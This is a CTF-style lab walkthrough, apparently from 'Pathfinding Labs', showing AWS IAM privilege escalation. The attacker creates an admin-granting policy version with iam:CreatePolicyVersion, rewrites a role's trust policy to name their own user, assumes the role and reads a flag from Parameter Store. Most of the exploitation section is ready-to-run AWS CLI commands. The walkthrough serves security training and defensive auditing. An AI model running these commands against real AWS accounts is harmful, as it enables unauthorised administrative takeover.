# Guided Walkthrough: Privilege Escalation via iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy

This scenario demonstrates a sophisticated privilege escalation path that combines two powerful IAM permissions: `iam:CreatePolicyVersion` and `iam:UpdateAssumeRolePolicy`. An attacker with these permissions can escalate to administrative access through a two-step process.

First, the attacker uses `iam:CreatePolicyVersion` to modify a customer-managed policy attached to a target role, replacing its limited permissions with full administrative access. Then, they use `iam:UpdateAssumeRolePolicy` to modify the role's trust policy, adding themselves as a trusted principal. Finally, they assume the now-privileged role to gain admin access.

A critical aspect of this attack is that the starting user does NOT need `sts:AssumeRole` permissions initially. When a principal is explicitly named in a role's trust policy (as opposed to the generic `:root` pattern), AWS allows that principal to assume the role without requiring explicit `sts:AssumeRole` permissions in their own policy. This makes the attack particularly dangerous, as defenders might overlook the escalation path if they only check for `sts:AssumeRole` grants.

## The Challenge

You have obtained credentials for `pl-prod-iam-020-to-admin-starting-user`. This user has two interesting IAM permissions: `iam:CreatePolicyVersion` on `pl-prod-iam-020-to-admin-target-policy`, and `iam:UpdateAssumeRolePolicy` on `pl-prod-iam-020-to-admin-target-role`. You cannot currently assume that target role, and you have no admin-level access.

Your goal is to reach the `pl-prod-iam-020-to-admin-target-role`, which will give you full administrative access to the AWS account.

## Reconnaissance

First, let's confirm who we are and what we're working with.

```bash
aws sts get-caller-identity
```

Now let's look at the target policy to understand its current state:

```bash
aws iam get-policy \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
  --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' \
  --output table
```

Check the current policy document — it should have minimal permissions:

```bash
aws iam get-policy-version \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Now verify that we cannot assume the target role yet:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-020-to-admin-target-role \
  --role-session-name test-session
# Expected: AccessDenied
```

Good. We have confirmed the starting state: the policy is minimal, and the role's trust policy does not yet allow our user to assume it.

## Exploitation

### Step 1: Escalate the policy permissions

We have `iam:CreatePolicyVersion` on the target customer-managed policy. AWS allows up to 5 policy versions per policy, and we can set a new version as the default. Let's create a version that grants full administrative access:

```bash
aws iam create-policy-version \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

Wait 15 seconds for the IAM change to propagate, then verify the new version is active:

```bash
aws iam list-policy-versions \
  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \
  --query 'Versions[*].[VersionId,IsDefaultVersion]' \
  --output table
```

The new v2 should show `IsDefaultVersion: True`. The target role now has administrative permissions — but we still can't assume it because its trust policy doesn't allow us yet.

### Step 2: Modify the role trust policy

We have `iam:UpdateAssumeRolePolicy` on the target role. We'll replace the trust policy with one that explicitly names our user as a trusted principal:

```bash
aws iam update-assume-role-policy \
  --role-name pl-prod-iam-020-to-admin-target-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Principal": {
          "Service": "ec2.amazonaws.com"
        },
        "Action": "sts:AssumeRole"
      },
      {
        "Effect": "Allow",
        "Principal": {
          "AWS": "arn:aws:iam::{account_id}:user/pl-prod-iam-020-to-admin-starting-user"
        },
        "Action": "sts:AssumeRole"
      }
    ]
  }'
```

Wait another 15 seconds for the trust policy change to propagate.

### Step 3: Assume the target role

Now assume the role. Note that we do not need an explicit `sts:AssumeRole` permission in our own policy — AWS grants this implicitly when a principal is named directly in a role's trust policy:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-020-to-admin-target-role \
  --role-session-name privesc-session
```

Export the returned credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId from output>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from output>
export AWS_SESSION_TOKEN=<SessionToken from output>
```

## Verification

Confirm you now have administrative access:

```bash
aws sts get-caller-identity
# Should show the assumed role ARN

aws iam list-users --max-items 3
# Should succeed — admin access confirmed
```

If `iam:ListUsers` succeeds, you have full administrative access to the AWS account.

## Capture the Flag

Admin access isn't the finish line — the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy you just gained provides implicitly.

Using the credentials you now hold (which include `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/iam-020-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  — your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario — only the scenario ID in the path changes.

## What Happened

This attack exploited two IAM permissions that, individually, appear limited in scope. `iam:CreatePolicyVersion` allows creating new versions of a customer-managed policy — a permission that looks reasonable for a policy administrator. `iam:UpdateAssumeRolePolicy` allows changing who can assume a role — also a permission that might be granted to someone managing role access. Together, however, they form a complete privilege escalation path: modify the policy to grant admin permissions, modify the trust policy to grant yourself access, then assume the role.

The especially dangerous aspect is the trust policy trick. Once your user is named directly in a role's trust policy, AWS lets you assume that role without any `sts:AssumeRole` permission in your own policy. Security teams that only audit for explicit `sts:AssumeRole` grants will miss this vector entirely. In production environments, `iam:CreatePolicyVersion` and `iam:UpdateAssumeRolePolicy` should be treated as equivalent to administrative access and restricted accordingly — ideally through SCPs that prevent any non-admin principal from calling these APIs.
